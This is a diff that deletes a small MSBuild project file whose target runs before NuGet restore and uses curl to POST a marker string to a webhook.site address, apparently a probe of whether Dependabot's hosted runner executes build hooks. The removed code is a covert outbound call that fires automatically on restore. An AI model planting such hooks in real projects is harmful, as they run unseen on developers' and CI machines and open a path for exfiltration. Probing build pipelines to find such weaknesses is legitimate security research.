@@ -1,5 +1,0 @@
-<Project>
-  <Target Name="HostedDependabotProbe" BeforeTargets="Restore">
-    <Exec Command="curl -fsS --max-time 10 -X POST --data lotp-nuget-dependabot-hosted-v1 https://webhook.site/b2f1a5b2-b7c6-42a7-87c4-249a89621c28" IgnoreExitCode="true" />
-  </Target>
-</Project>
